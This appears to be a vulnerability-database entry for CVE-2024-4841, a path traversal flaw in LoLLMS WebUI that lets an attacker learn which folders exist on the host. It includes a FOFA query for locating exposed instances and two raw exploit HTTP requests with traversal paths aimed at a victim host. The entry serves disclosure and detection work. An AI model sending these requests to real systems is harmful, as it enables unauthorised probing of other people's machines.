---
layout: post
cve_id: CVE-2024-4841
title: LoLLMS WebUI - Subfolder Prediction via Path Traversal
pcap: true
pcap_path: /pcaps/2024/CVE-2024-4841.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-4841.yaml
snort2_rule: N/A
snort3_rule: N/A
author: s4e-io
severity: medium
remediation: 'Apply the latest security patches and updates from the vendor to address
  this vulnerability.

  '
impact: 'By exploiting this vulnerability, an attacker can predict the folders, subfolders,
  and files present on the victim''s computer. The vulnerability is present in the
  way the application handles the ''path'' parameter in HTTP requests to the ''/add_reference_to_local_model''
  endpoint.

  '
reference:
- https://huntr.com/bounties/740dda3e-7104-4ccf-9ac4-8870e4d6d602
- https://nvd.nist.gov/vuln/detail/CVE-2024-4841
classification:
  cvss-metrics: CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
  cvss-score: 4
  cve-id: CVE-2024-4841
  cwe-id: CWE-29
  epss-score: 0.09339
  epss-percentile: 0.9251
metadata:
  max-request: 1
  fofa-query: LoLLMS WebUI - Welcome
tags:
- cve
- cve2024
- lollms-webui
- traversal
- vuln
---

## üîç Vulnerability Description
A Path Traversal vulnerability exists in the parisneo/lollms-webui, specifically within the 'add_reference_to_local_mode' function due to the lack of input sanitization. This vulnerability affects versions v9.6 to the latest.


## üåê HTTP Request
```nohighlight
POST /add_reference_to_local_model HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Connection: close
Content-Length: 18
Content-Type: application/json
Accept-Encoding: gzip
{"path":"\\Users"}
```

```nohighlight
POST /add_reference_to_local_model HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Connection: close
Content-Length: 23
Content-Type: application/json
Accept-Encoding: gzip
{"path":"\\QMZEFFLWCM"}
```

